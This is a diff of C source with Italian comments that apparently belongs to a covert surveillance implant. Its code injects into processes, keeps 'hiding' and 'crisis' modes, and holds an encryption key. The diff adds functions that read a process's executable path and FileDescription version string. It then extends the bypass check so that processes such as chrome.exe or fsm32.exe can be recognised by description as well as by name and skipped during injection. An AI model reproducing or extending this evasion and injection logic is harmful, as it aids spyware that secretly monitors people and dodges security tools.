@@ -46,6 +46,9 @@
 #include "status_log.h"
 #include "format_resistant.h"
 
+#include <tchar.h>
+#include <Strsafe.h>
+
 #pragma bss_seg("shared")
 BOOL is_demo_version;
 BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
@@ -59,6 +62,7 @@ DWORD log_free_space;   // Spazio a disposizione per i log
 DWORD log_active_queue; // Quale coda e' attiva 1 o 0
 DWORD process_bypassed; //Numero di processi da bypassare
 char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
+WCHAR process_bypass_desc[EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
 DWORD social_process_control;	// Semaforo per controllare il processo "social"
 BOOL network_crisis;			// Se deve fermare le sync
 BOOL system_crisis;				// Se deve fermare i comandi e l'hiding
@@ -138,6 +142,7 @@ nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura dell
 HANDLE conf_file_handle = NULL;
 
 extern BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
+BOOL ReadDesc(DWORD pid, WCHAR *file_desc, DWORD len);
 
 typedef DWORD PROCESSINFOCLASS;
 typedef struct _SYSTEM_HANDLE_INFORMATION {
@@ -495,7 +500,16 @@ void HM_RemoveCore()
 BOOL HM_ProcessByPass(DWORD pid)
 {
 	char *process_name;
+	WCHAR process_description[500];
 	DWORD i;
+
+	// Faccio prima un check sulle descizioni
+	if (ReadDesc(pid, process_description, sizeof(process_description))) {
+		for(i=0; i<EMBEDDED_BYPASS; i++) {
+			if (process_bypass_desc[i][0]!=0 && CmpWildW(process_bypass_desc[i], process_description))
+				return TRUE;
+		}
+	}
 
 	// Prende il nome del processo "pid"
 	if ( !(process_name = HM_FindProc(pid)) )
@@ -505,10 +519,12 @@ BOOL HM_ProcessByPass(DWORD pid)
 	for(i=0; i<process_bypassed; i++) {
 		if (CmpWild((unsigned char *)process_bypass_list[i], (unsigned char *)process_name)) {
 			SAFE_FREE(process_name);
-			return TRUE;
+			// Se e' uno dinamico, o non ho descrizione valida, allora controlla solo il nome
+			if (i>=EMBEDDED_BYPASS || process_bypass_desc[i][0]==0)
+				return TRUE;
+			return FALSE;
 		}
 	}
-
 	SAFE_FREE(process_name);
 	return FALSE;
 }
@@ -1265,6 +1281,77 @@ WCHAR *HM_FindProcW(DWORD pid)
 	return ret_name;
 }
 
+BOOL HM_FindProcPath(DWORD pid, WCHAR *file_path, DWORD len)
+{
+	HANDLE hProc;
+
+	hProc = OpenProcess(0x410, FALSE, pid);
+	if (hProc == NULL)
+		return FALSE;
+
+	if (GetModuleFileNameExW(hProc, NULL, file_path, len) > 0) {	
+		CloseHandle(hProc);
+		return TRUE;
+	}
+
+	CloseHandle(hProc);
+	return FALSE;
+}
+
+// Ritorna la descrizione di un processo dato il PID
+BOOL ReadDesc(DWORD pid, WCHAR *file_desc, DWORD len)
+{
+	HRESULT hr;
+	DWORD size, dummy;
+	BYTE *pBlock;
+	UINT cbTranslate = 0, desc_size = 0;
+	WCHAR *description;
+	WCHAR file_path[MAX_PATH];
+	BOOL ret_val;
+	BYTE SubBlock[100];
+	struct LANGANDCODEPAGE {
+	  WORD wLanguage;
+	  WORD wCodePage;
+	} *lpTranslate;
+
+	if (!HM_FindProcPath(pid, file_path, sizeof(file_path)))
+		return FALSE;
+
+	size = GetFileVersionInfoSizeW(file_path, &dummy);
+	if (size == 0) 
+		return FALSE;
+	
+	pBlock = (BYTE *)malloc(size);
+	if (!pBlock) 
+		return FALSE;
+	
+	if (!GetFileVersionInfoW(file_path, 0, size, pBlock)) {
+		free(pBlock);
+		return FALSE;
+	}
+
+	ret_val = VerQueryValueW(pBlock, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate);
+	if (!ret_val || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
+		free(pBlock);
+		return FALSE;
+	}
+
+	ZeroMemory(SubBlock, sizeof(SubBlock));
+	hr = StringCchPrintfW((STRSAFE_LPWSTR)SubBlock, sizeof(SubBlock)-1, L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
+	if (FAILED(hr)) {
+		free(pBlock);
+		return FALSE;
+	}
+
+	if (VerQueryValueW(pBlock, (LPCWSTR)SubBlock, (LPVOID *)&description, &desc_size)) {
+		_snwprintf_s(file_desc, len/sizeof(WCHAR), _TRUNCATE, L"%s", description);		
+		free(pBlock);
+		return TRUE;
+	}
+
+	free(pBlock);
+	return FALSE;
+}
 
 // Torna TRUE se il processo e' dell'utente
 // chiamante
@@ -2300,6 +2387,9 @@ void HM_UpdateGlobalConf()
 	strcpy(process_bypass_list[27],"chrome.exe");
 	strcpy(process_bypass_list[28],"fsm32.exe");
 	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS
+
+	// Gestisco le descrizioni per i processi per cui le ho
+	ZeroMemory(process_bypass_desc, sizeof(process_bypass_desc));
 
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
